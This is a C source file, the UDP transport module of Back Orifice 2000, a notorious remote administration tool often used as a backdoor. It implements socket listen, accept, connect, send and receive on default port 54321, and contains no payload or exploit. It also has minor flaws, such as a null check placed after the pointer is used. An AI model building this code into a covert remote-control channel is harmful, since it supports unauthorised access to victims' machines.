/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<winsock.h>
#include<iohandler.h>
#include<io_simpleudp.h>
#include<config.h>
#include<strhandle.h>

static IO_HANDLER g_SimpleIOH;
	
#pragma pack(push,1)

#define MAX_UDP_CHILDREN 32

typedef struct __udpsocket {
	SOCKET s;
	SOCKADDR_IN rmt;
	DWORD dwState;
	DWORD dwTime;
	char svConnectAddr[256];
	struct __udpsocket *pParent;
	struct __udpsocket **pChildSockets;
} UDPSOCKET;

#define UDP_TIMEOUT 120000

#define US_CONNECTED 1
#define US_LISTEN 2

typedef struct {
	DWORD dwFlags;
} UDPHDR;

#define UF_RST 1

#pragma pack(pop)

static char g_svUDPIOConfig[]="<**CFG**>UDPIO\0"
                       "N[0,65535]:Default Port=54321\0";
	
// Proper linkage type

IO_HANDLER *GetSimpleUdpIOHandler(void);

int _cdecl UDPIO_Insert(void)
{
	// Initialize Winsock 1.1
	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(1,1), &wsaData)!=0) return -1;
	if(LOBYTE(wsaData.wVersion)!=1 || HIBYTE(wsaData.wVersion)!=1) {
		WSACleanup();
		return -1;
	}
	
	return 0;
}

int _cdecl UDPIO_Remove(void)
{
	// Clean up Winsock 1.1
	WSACleanup();
	return 0;
}

void * _cdecl UDPIO_Listen(char *svTarget)
{
	UDPSOCKET *udps;

	// Get listen port
	struct in_addr bindAddr;
	bindAddr.S_un.S_addr=INADDR_ANY;
	int nPort=0;

	if(svTarget==NULL) nPort=GetCfgNum(g_svUDPIOConfig,"Default Port");	
	else if(lstrcmpi(svTarget,"RANDOM")!=0) {
		char svAdr[260],*svPort;
		lstrcpyn(svAdr,svTarget,260);
		svPort=BreakString(svAdr,":");
		if(svPort==NULL) {
			nPort=atoi(svAdr);
		} else {
			bindAddr.S_un.S_addr=inet_addr(svAdr);
			nPort=atoi(svPort);
		}
	}

	// Create listener socket
	SOCKET s;
	s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	if(s==INVALID_SOCKET) return NULL;

	// Bind socket
	SOCKADDR_IN saddr;
	memset(&saddr,0,sizeof(SOCKADDR_IN));
	saddr.sin_addr.S_un.S_addr=INADDR_ANY;
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons((WORD)nPort);
	
	if(bind(s,(SOCKADDR *) &saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
		closesocket(s);
		return NULL;
	}

	int namelen=sizeof(SOCKADDR_IN);
	getsockname(s,(SOCKADDR *)&saddr,&namelen);

	// Allocate state structure
	udps=(UDPSOCKET *)malloc(sizeof(UDPSOCKET));
	if(udps==NULL) {
		closesocket(s);
		return NULL;
	}

	// Fill in state structure
	udps->s=s;
	memset(&(udps->rmt),0,sizeof(SOCKADDR_IN));
	udps->dwState=US_LISTEN;
	udps->dwTime=0; // No timeout on listening sockets
	udps->pParent=NULL;
	udps->pChildSockets=(UDPSOCKET **)malloc(MAX_UDP_CHILDREN * sizeof(UDPSOCKET *));
	if(udps->pChildSockets==NULL) {
		free(udps);
		closesocket(s);
		return NULL;
	}
	int i;
	for(i=0;i<MAX_UDP_CHILDREN;i++) {
		udps->pChildSockets[i]=NULL;
	}

	// Fill in connect address
	if(bindAddr.S_un.S_addr==INADDR_ANY) {
		char svHostName[256];
		struct hostent *he;
		struct in_addr *pAddr;
		gethostname(svHostName,256);
		he=gethostbyname(svHostName);
		pAddr=(struct in_addr *)he->h_addr_list[0];
		if(he) {
			wsprintf(udps->svConnectAddr,"%u.%u.%u.%u:%u",pAddr->S_un.S_un_b.s_b1,pAddr->S_un.S_un_b.s_b2,pAddr->S_un.S_un_b.s_b3,pAddr->S_un.S_un_b.s_b4,ntohs(saddr.sin_port));
		} else {
			lstrcpyn(udps->svConnectAddr,"No Connect Addr",256);
		}
	} else {
		lstrcpyn(udps->svConnectAddr,svTarget,256);
	}
	
	
		

	return udps;
}

void * _cdecl UDPIO_Accept(void *data, char *svAddr, int nMaxLen)
{
	// Check to see if this is a listening socket
	UDPSOCKET *udps=(UDPSOCKET *)data;
	if(udps->dwState!=US_LISTEN) return NULL;
	
	// Check for incoming data
	DWORD len; 
	if(ioctlsocket(udps->s,FIONREAD,&len)<0) return NULL;
	if(len>0) {
		// Allocate memory for packet
		SOCKADDR_IN sai_from;
		int fromlen=sizeof(SOCKADDR_IN);
		BYTE *buf=(BYTE *)malloc(len);
		if(buf==NULL) return NULL;

		// Peek the message
		len=recvfrom(udps->s,(char *)buf,len,MSG_PEEK,(SOCKADDR *)&sai_from,&fromlen);
		if(len<0) {
			free(buf);
			return NULL;
		}
				
		// Check to see if this is a new connection
		int i;
		for(i=0;i<MAX_UDP_CHILDREN; i++) {
			if(udps->pChildSockets[i]) {
				if(memcmp(&(udps->pChildSockets[i]->rmt),&sai_from,sizeof(SOCKADDR_IN))==0) {
					// Woops, it's for another child socket
					free(buf);
					return NULL;
				}
			}
		}
		
		// Check to make sure it isn't a 'close' message
		if( (((UDPHDR *)buf)->dwFlags & UF_RST)==UF_RST ) {
			// If so, it isn't for a child connection, so we throw it away.
			len=recvfrom(udps->s,(char *)buf,len,0,(SOCKADDR *)&sai_from,&fromlen);		
			free(buf);
			return NULL;
		}
		free(buf);

		// Find connections table slot
		int nTimeout=-1;
		DWORD dwTimeDiff,dwLastTimeDiff=0;
		for(i=0;i<MAX_UDP_CHILDREN;i++) {
			if(udps->pChildSockets[i]==NULL) break;			
			dwTimeDiff=(GetTickCount()-udps->pChildSockets[i]->dwTime);
			if(dwTimeDiff>dwLastTimeDiff) {
				nTimeout=i;
				dwLastTimeDiff=dwTimeDiff;
			}
		}
		// Clean out connections table if things are full
		if(i==MAX_UDP_CHILDREN) {
			if(dwLastTimeDiff>=UDP_TIMEOUT) {
				UDPSOCKET *pios=udps->pChildSockets[nTimeout];
				udps->pChildSockets[nTimeout]=NULL;								
				closesocket(pios->s);
				pios->dwState=0;
				i=nTimeout;
			} else {
				// Reject accept if things don't work
				return NULL;
			}
		}
	
		// Create accepted socket
		UDPSOCKET *acc_ios;
		acc_ios=(UDPSOCKET *)malloc(sizeof(UDPSOCKET));
		if(acc_ios==NULL) return NULL;
		
		// Add to connections table
		udps->pChildSockets[i]=acc_ios;

		// Fill in accepted socket
		DuplicateHandle(GetCurrentProcess(),(HANDLE)(udps->s),GetCurrentProcess(),(HANDLE *)&(acc_ios->s),0,FALSE,DUPLICATE_SAME_ACCESS);
		acc_ios->rmt=sai_from;
		acc_ios->dwState=US_CONNECTED;
		acc_ios->dwTime=GetTickCount();
		acc_ios->pParent=udps;
		acc_ios->pChildSockets=NULL; // No child sockets for accepted sockets
		if(nMaxLen>16) {
			wsprintf(svAddr,"%3u.%3u.%3u.%3u",
				sai_from.sin_addr.S_un.S_un_b.s_b1,
				sai_from.sin_addr.S_un.S_un_b.s_b2,
				sai_from.sin_addr.S_un.S_un_b.s_b3,
				sai_from.sin_addr.S_un.S_un_b.s_b4);
		}
		
		return acc_ios;
	}

	return NULL;	
}

void * _cdecl UDPIO_Connect(char *svTarget)
{
	// Create socket
	SOCKET s;
	s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	if(s==INVALID_SOCKET) return NULL;

	// Get target port
	int nPort;
	char svHost[256],*ptr;
	lstrcpyn(svHost,svTarget,256);
	for(ptr=svHost;((*ptr)!=':') && ((*ptr)!=NULL);ptr++);
	if((*ptr)==':') {
		*ptr='\0';
		ptr++;
		nPort=atoi(ptr);
	}
	else nPort=GetCfgNum(g_svUDPIOConfig,"Default Port");

	// Resolve hostname
	DWORD addr;
	if((addr=inet_addr(svHost))==INADDR_NONE) {
		struct hostent *he=gethostbyname(svHost);
		if(he==NULL) {
			closesocket(s);
			return NULL;
		}
		addr=*(DWORD *)(he->h_addr_list[0]);
	}

	// Create socket address
	SOCKADDR_IN saddr;
	memset(&saddr,0,sizeof(SOCKADDR_IN));
	saddr.sin_addr.S_un.S_addr=addr;
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons((WORD)nPort);
	
	// Allocate internal state structure
	UDPSOCKET *udps=(UDPSOCKET *)malloc(sizeof(UDPSOCKET));
	if(udps==NULL) {
		closesocket(s);
		return NULL;
	}
	
	// Always 'connected' since there is no handshake

	udps->s=s;
	udps->rmt=saddr;
	udps->dwState=US_CONNECTED;
	udps->dwTime=GetTickCount();
	udps->pParent=NULL;
	udps->pChildSockets=NULL; // No child sockets for source socket

	return udps;
}

int _cdecl UDPIO_Close(void *ios)
{
	int i;
	UDPSOCKET *udps=(UDPSOCKET *)ios;
	if(udps==NULL) return -1;

	if((udps->dwState & US_CONNECTED) || (udps->dwState & US_LISTEN)) {
		if(udps->dwState & US_CONNECTED) {
			// Send close packet (don't care if it makes it over though)
			UDPHDR hdr;
			hdr.dwFlags=UF_RST;
			sendto(udps->s,(char *)&hdr,sizeof(UDPHDR),0,(SOCKADDR *)&(udps->rmt),sizeof(SOCKADDR_IN));
			if(udps->pParent!=NULL) {
				for(i=0;i<MAX_UDP_CHILDREN;i++) {
					if(udps->pParent->pChildSockets[i]==udps) {
						udps->pParent->pChildSockets[i]=NULL;
					}
				}
			}
		}
		if(udps->dwState & US_LISTEN) {
			for(i=0;i<MAX_UDP_CHILDREN;i++) {
				if(udps->pChildSockets[i]!=NULL) {
					udps->pChildSockets[i]->pParent=NULL;
				}
			}
			free(udps->pChildSockets);
		}
		closesocket(udps->s);
	}
	
	free(udps);
	return 0;
}

char * _cdecl UDPIO_Query(void)
{
	return "UDPIO: Back Orifice UDP IO Module v1.0";
}

int _cdecl UDPIO_Recv(void *data, BYTE **pInData, int *pnInDataLen)
{
	UDPSOCKET *udps=(UDPSOCKET *)data;
	
	// Ensure socket is connected
	if(udps->dwState!=US_CONNECTED) return -1;
	
	// Check for incoming data
	DWORD len;
	ioctlsocket(udps->s,FIONREAD,&len);
	if(len>=sizeof(UDPHDR)) {
		// Allocate buffer for data
		BYTE *buf=(BYTE *)malloc(len);
		if(buf==NULL) {
			*pInData=NULL;
			*pnInDataLen=0;
			return -1;
		}

		// Peek at data
		SOCKADDR_IN sai_from;
		int fromlen=sizeof(SOCKADDR_IN);
		DWORD lenret;
		lenret=recvfrom(udps->s,(char *)buf,len,MSG_PEEK,(struct sockaddr *)&sai_from,&fromlen);
		if(lenret<len) {
			free(buf);
			*pInData=NULL;
			*pnInDataLen=0;
			return -1;
		}

		// Ensure that it's for this socket
		if(memcmp(&(udps->rmt),&sai_from,sizeof(SOCKADDR_IN))!=0) {
			free(buf);
			*pInData=NULL;
			*pnInDataLen=0;
			return 0;
		}
		
		// Get real packet
		fromlen=sizeof(SOCKADDR_IN);
		lenret=recvfrom(udps->s,(char *)buf,len,0,(struct sockaddr *)&sai_from,&fromlen);
		if(lenret<len) {
			free(buf);
			*pInData=NULL;
			*pnInDataLen=0;
			return -1;
		}

		// Check for connection reset
		if(((UDPHDR *)buf)->dwFlags & UF_RST) {
			free(buf);
			*pInData=NULL;
			*pnInDataLen=0;
			return -1;
		}
		
		// Pass data back to application
		*pInData=(buf+sizeof(UDPHDR));
		*pnInDataLen=(len-sizeof(UDPHDR));
		return 1;
	}
	*pInData=NULL;
	*pnInDataLen=0;	
	return 0;
}

int _cdecl UDPIO_Send(void *data, BYTE *pData, int nDataLen)
{
	UDPSOCKET *udps=(UDPSOCKET *)data;
	
	// Ensure socket is connected
	if(udps->dwState!=US_CONNECTED) return -1;
	
	// Allocate buffer for header and data
	BYTE *buf=(BYTE *)malloc(nDataLen+sizeof(UDPHDR));
	if(buf==NULL) return -1;

	// Create packet
	((UDPHDR *)buf)->dwFlags=0;
	memcpy(buf+sizeof(UDPHDR),pData,nDataLen);
	
	// Send packet
	int lenret;
	lenret=sendto(udps->s,(char *)buf,nDataLen+sizeof(UDPHDR),0,(SOCKADDR *)&(udps->rmt),sizeof(SOCKADDR_IN));
	free(buf);
	if(lenret==SOCKET_ERROR) 
		return -1;
	if(lenret<nDataLen) 
		return 0;

	return 1;
}

void _cdecl UDPIO_Free(void *data, BYTE *pBuffer)
{
	if(pBuffer==NULL) return;
	free(pBuffer-sizeof(UDPHDR));
}

int _cdecl UDPIO_GetConnectAddr(void *data, char *svAddr, int nMaxLen)
{
	UDPSOCKET *udps=(UDPSOCKET *)data;

	if(nMaxLen>256) nMaxLen=256;
	if(nMaxLen<0) return -1;
	lstrcpyn(svAddr,udps->svConnectAddr,nMaxLen);
	return 0;
}

IO_HANDLER *GetSimpleUdpIOHandler(void)
{	
	g_SimpleIOH.pClose=UDPIO_Close;
	g_SimpleIOH.pConnect=UDPIO_Connect;
	g_SimpleIOH.pFree=UDPIO_Free;
	g_SimpleIOH.pListen=UDPIO_Listen;
	g_SimpleIOH.pAccept=UDPIO_Accept;
	g_SimpleIOH.pQuery=UDPIO_Query;
	g_SimpleIOH.pRecv=UDPIO_Recv;
	g_SimpleIOH.pInsert=UDPIO_Insert;
	g_SimpleIOH.pRemove=UDPIO_Remove;
	g_SimpleIOH.pSend=UDPIO_Send;
	g_SimpleIOH.pGetConnectAddr=UDPIO_GetConnectAddr;

	return &g_SimpleIOH;
}
